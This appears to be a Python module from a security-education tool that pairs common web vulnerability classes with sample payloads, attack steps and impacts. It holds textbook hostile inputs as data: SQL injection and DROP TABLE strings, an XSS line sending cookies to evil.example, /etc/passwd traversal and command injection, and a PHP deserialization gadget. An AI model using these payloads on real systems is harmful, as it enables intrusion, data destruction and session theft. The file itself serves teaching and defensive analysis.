"""
SecureAI X — Attack Simulation Engine
Educational payload examples and impact narratives per vulnerability class.
No live exploitation happens — this only returns illustrative data.
"""

from typing import Dict, List

SIMULATIONS = {
    "SQL Injection": dict(
        payload="' OR 1=1 -- ",
        steps=[
            "Attacker enters the payload into a vulnerable input field.",
            "The application appends it directly into the SQL query string.",
            "The WHERE clause always evaluates true, bypassing the intended filter.",
        ],
        impact=["Authentication bypass", "Unauthorized data access", "Full table dump"],
    ),
    "SQL Injection (String Concatenation)": dict(
        payload="1; DROP TABLE users; -- ",
        steps=[
            "Attacker supplies a value ending the original statement early.",
            "A second, attacker-defined SQL statement is appended.",
            "If stacked queries are permitted, the second statement executes.",
        ],
        impact=["Data destruction", "Privilege escalation", "Service disruption"],
    ),
    "Cross-Site Scripting (XSS)": dict(
        payload="<script>fetch('https://evil.example/steal?c='+document.cookie)</script>",
        steps=[
            "Attacker submits the payload through the vulnerable field or URL.",
            "The server reflects it back into the page unescaped.",
            "The victim's browser executes it as if it were part of the site.",
        ],
        impact=["Session/cookie theft", "Account takeover", "Phishing overlay injection"],
    ),
    "Hardcoded Credentials": dict(
        payload="grep -R \"password\" . ",
        steps=[
            "Attacker gains read access to the repository (leak, insider, backup).",
            "A simple text search reveals the embedded credential.",
            "The credential is reused against the live system or other services.",
        ],
        impact=["Direct unauthorized access", "Credential reuse across systems"],
    ),
    "Insecure File Inclusion": dict(
        payload="?page=../../../../etc/passwd",
        steps=[
            "Attacker manipulates the file-path parameter.",
            "The application includes an unintended local (or remote) file.",
            "Included content is parsed/executed as PHP if attacker-controlled.",
        ],
        impact=["Source code / secrets disclosure", "Remote code execution (RFI)"],
    ),
    "Weak Cryptographic Hash": dict(
        payload="rainbow-table lookup of stolen hash",
        steps=[
            "Database is exfiltrated through an unrelated flaw or leak.",
            "Attacker looks up each md5/sha1 hash in a precomputed table.",
            "Plaintext passwords are recovered within seconds to minutes.",
        ],
        impact=["Mass account compromise", "Credential-stuffing fuel for other sites"],
    ),
    "Insecure Deserialization": dict(
        payload="O:8:\"EvilGadget\":1:{s:4:\"code\";s:10:\"system('id')\";}",
        steps=[
            "Attacker crafts a serialized object matching a class in the app.",
            "unserialize() reconstructs the object and triggers magic methods.",
            "A gadget chain in the codebase turns this into code execution.",
        ],
        impact=["Remote code execution", "Full server compromise"],
    ),
    "Code Injection (eval)": dict(
        payload="1; system('whoami');",
        steps=[
            "Attacker-influenced string reaches the eval() call.",
            "PHP parses and executes it exactly like source code.",
            "Any function available to the app is now available to the attacker.",
        ],
        impact=["Arbitrary code execution", "Full application compromise"],
    ),
    "Command Injection": dict(
        payload="; cat /etc/passwd #",
        steps=[
            "Attacker input reaches a shell-executing function unescaped.",
            "The shell interprets the injected metacharacters as new commands.",
            "The extra command runs with the same privileges as the web server.",
        ],
        impact=["Server takeover", "Lateral movement", "Data exfiltration"],
    ),
    "Missing CSRF Protection": dict(
        payload="<img src=\"https://victim-site/transfer?to=attacker&amt=1000\">",
        steps=[
            "Victim, already logged in, visits an attacker-controlled page.",
            "The page auto-submits a request to the vulnerable endpoint.",
            "The browser attaches the victim's session cookie automatically.",
        ],
        impact=["Unauthorized state changes on behalf of the victim"],
    ),
}


def simulate(finding_type: str) -> Dict:
    return SIMULATIONS.get(
        finding_type,
        dict(payload="n/a", steps=["No simulation profile available for this class."], impact=[]),
    )


def simulate_all(finding_types: List[str]) -> Dict[str, Dict]:
    seen = []
    result = {}
    for t in finding_types:
        if t not in seen:
            seen.append(t)
            result[t] = simulate(t)
    return result
